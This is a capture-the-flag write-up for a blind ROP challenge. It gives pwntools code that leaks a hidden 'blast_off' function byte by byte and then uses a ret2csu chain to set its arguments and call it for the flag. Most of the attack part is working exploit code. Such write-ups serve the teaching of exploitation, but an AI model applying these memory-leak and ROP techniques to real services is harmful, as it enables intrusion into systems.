# Chal9

## Solution

The following is a brop challenge. The details of exploiting a typical brop problem will be ommitted. We will begin from after the offset, stop gadget address, brop gadget address, and printf address have been located.

Typically, the next step in a brop challenge would be to attempt to find `/bin/sh` or `cat flag.txt` in the binary. Unfortunately, after many combs through the binary, no string like these exist. There needs to be another attack strategy for this binary.

When the binary starts, it gives us the address of something called `blast_off`. When we check this address, we see what appears to be another randomized address. When we look at this other address, we see what appears to be assembly instructions. It seems that `blast_off` is some kind of function.

Thus, we construct a loop that grabs the `blast_off` function byte-by-byte (this function is not perfect and often will arrive at some strange instructions):
```python
def map_blast_off(offset, stop_addr, brop_addr, printf_addr):
    pop_rdi = brop_addr + 9
    data = b''
    for i in range(0x100):
        log.info(f"Mapping the {i}th address of Blast Off")
        with context.quiet:
            p = start()
            payload = cyclic(offset)
            payload += p64(pop_rdi)
            payload += p64(BLAST_OFF)
            payload += p64(printf_addr + 16)
            payload += p64(stop_addr)
            p.sendlineafter(b'start:', payload)
            s = p.recvline()
            addr = u64(s[1:-1] + b'\0'*(8 - len(s[1:-1])))

            payload = cyclic(offset)
            payload += p64(pop_rdi)
            payload += p64(addr + i)
            payload += p64(printf_addr + 16)
            payload += p64(stop_addr)
            p.sendlineafter(b'start:', payload)
            try:
                s = p.recvline()
                if len(s) <= 2:
                    data += b'\0'
                else:
                    data += s[1:2]
                p.close()
            except EOFError:
                i -= 1
                p.close()
    return data
```
When we get these assembly instructions and examine them, we notice that it performs three comparisons: `edi == 3`, `esi == 2`, and `edx == 1`. Thus, we are motivated to try to set these registers to these values and then call blast off. To set the values of these registers, we use the brop gadget to perform a basic `ret2csu` exploit:
```python
def pwn(offset, stop_addr, brop_addr, printf_addr):
    with context.quiet:
        p = start()
        payload = cyclic(offset)
        payload += p64(brop_addr + 10)
        payload += p64(brop_addr)
        payload += p64(0x0)
        payload += p64(0x0)
        payload += p64(0x3)
        payload += p64(0x2)
        payload += p64(0x1)
        payload += p64(BLAST_OFF)
        payload += p64(brop_addr - 0x1a)
        p.sendlineafter(b'start:', payload)
        p.interactive()
```
When we call this exploit, we obtain the value of the flag.